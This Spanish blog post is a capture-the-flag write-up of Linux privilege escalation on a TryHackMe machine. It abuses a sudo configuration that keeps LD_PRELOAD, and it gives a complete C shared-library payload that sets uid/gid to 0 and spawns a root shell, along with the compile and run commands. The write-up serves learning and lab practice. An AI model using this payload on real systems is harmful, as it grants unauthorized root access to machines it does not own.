---
layout: post
title:  "Explotación de la vulnerabilidad LD_PRELOAD Capabilties"
description: En este post aprenderemos como explotar la capabilite LD_PRELOAD.

tags: ld,capabilities,explotacion,privesc
---


# Situacion
Me encontraba realizando la máquina Keldagrim de TryHackMe.
Había conseguido acceso NO PRIVILEGIADO a la máquina víctima y no encontraba véctores de ataque para escalar privilegios, ahí fue cuando decídi usar "LINPEAS.SH" para automatizar la enumeración.
 
Entre otras cosas muchas, me enumeró que "env_keep+=LD_PRELOAD" tenía la capabilite para usarlo activada...(esto se puede ver supuestamente en "sudo -l")

Anteriormente corrí "sudo -l" y también me enumeró que podía ejecutar "ps" como sudo sin contraseña. El binario de ``ps`` no es explotable aunque tengas sudo, sin embargo, si puedes correr algun binario con sudo y tienes ``LD_PRELOAD activado`` , puedes conseguir root.

# Explicación

LD_PRELOAD es básicamente una forma de indicarle a programas C que librerías precargar para después ejecutar X programa.
Por tanto, si creamos un payload en C compilado que nos estableza todos nuestro datos como root (GID,UID,ETC...) y le pedimos que lo precargue, para posteriormente ejecutarlo, el resultado será que ejecutará nuestro payload (una supuesta libreria C) como los permisos del programa X que indicamos antes.

Es decir:


```bash 
  sudo LD_PRELOAD=/tmp/shell.so ps
  #Podemos indicar sudo ya que este comando supuestamente solo va a ejecutar PS,
  #el cúal podemos ejecutar como sudo. (lo encontramos en sudo -l)
  #Por tanto y en resúmen, ejecutará "ps" como sudo y precargará la libreria(Payload)
  #con los mismos permisos, es decir,SUDO. Por tanto, si el payload esta 
  #configurado correctamente, obtendremos permisos de root.
```
# Creación del payload (recomiendo hacer todo esto en /tmp)
Abrimos un editor de texto, añadimos el siguiente contenido y lo guardamos como shell.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

Lo compilamos en un fichero llamado shell.so...
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

y para finalizar, lo ejecutamos.
```bash
sudo LD_PRELOAD=/tmp/shell.so ps
```
Si todo ha salido bien, conseguiremos root.

# Agradecimientos/Bibliografía
[Linux Privilege Escalation using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/) 
[Using LD_PRELOAD to exploit Binaries](https://forum.hackthebox.eu/discussion/4071/using-ld-preload-to-exploit-binaries)





